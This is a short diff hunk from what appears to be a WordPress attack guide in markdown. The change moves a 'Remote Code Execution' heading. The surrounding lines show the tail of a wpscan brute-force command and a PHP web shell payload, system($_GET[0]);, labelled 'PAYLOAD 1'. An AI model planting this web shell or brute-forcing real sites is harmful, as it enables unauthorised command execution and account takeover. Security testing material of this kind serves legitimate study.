@@ -104,9 +104,9 @@ wpscan --url https://target.com \
        -o bruteforce_results.txt
 ```
 
-# Remote Code Execution
 <img width="902" height="535" alt="image" src="https://github.com/user-attachments/assets/fe15361e-1a32-41cc-932d-212b08100697" />
 ---
+# Remote Code Execution
 ```powershell
 PAYLOAD 1
 system($_GET[0]);
